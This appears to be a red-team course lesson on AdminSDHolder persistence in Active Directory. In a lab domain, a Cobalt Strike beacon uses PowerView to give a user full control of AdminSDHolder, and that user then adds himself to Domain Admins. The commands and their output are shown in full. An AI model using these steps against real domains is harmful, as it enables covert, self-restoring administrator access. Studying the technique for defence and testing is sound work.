The **AdminSDHolder** is a DACL template used to protect sensitive principals from modification. You can test this in the lab by modifying the DACL on the Domain Admins domain group (e.g. give bfarmer full control). Within ~60 minutes, you will find this entry will have vanished. Protected objects include Enterprise & Domain Admins, Schema Admins, Backup Operators and krbtgt.

The AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> run net group "Domain Admins" bfarmer /add /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

System error 5 has occurred.

Access is denied.

beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/adminsdholder.png)

  

Once this propagates, the principal will have full control over the aforementioned sensitive principals.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/da-full-control.png)

  

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            nlamb                    
The command completed successfully.

beacon> run net group "Domain Admins" bfarmer /domain /add
The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            bfarmer                  nlamb                    
The command completed successfully.
```